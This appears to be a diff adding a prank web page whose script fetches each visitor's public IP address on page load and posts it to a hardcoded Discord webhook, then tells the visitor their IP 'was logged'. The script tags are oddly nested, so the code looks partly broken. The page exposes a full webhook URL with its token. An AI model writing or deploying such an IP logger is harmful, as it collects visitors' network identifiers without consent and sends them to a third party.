@@ -1,0 +1,30 @@
+
+<script type="application/javascript">
+<script type="application/javascript" src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
+    function getIP(json) {
+        console.log("ur ip is: ", json.ip);
+        var request = new XMLHttpRequest();
+        const Hook = "https://discord.com/api/webhooks/901499628598472764/F_9YTF0JCowmbiiwhmFVZPMF3HNPIqfIVdsfw5frlMAbWRuxv4XE0OWje8vXSsenJ-cg";
+
+        var request = new XMLHttpRequest();
+        request.open("POST", Hook);
+        request.setRequestHeader('Content-type', 'application/json');
+        var params = {
+            username: "bohp",
+            embeds: [
+                { "color": 7506394, // Decimal Color [ Blue ]
+                "title": "new ip lmfao",
+                "description": json.ip
+            }]
+        }
+        request.send(JSON.stringify(params));
+
+    }
+    
+</script>
+<center>oh no!!! your ip!!! was logged!!</center>
+<style>
+.center {
+  font-size: 200px;
+}
+</style>
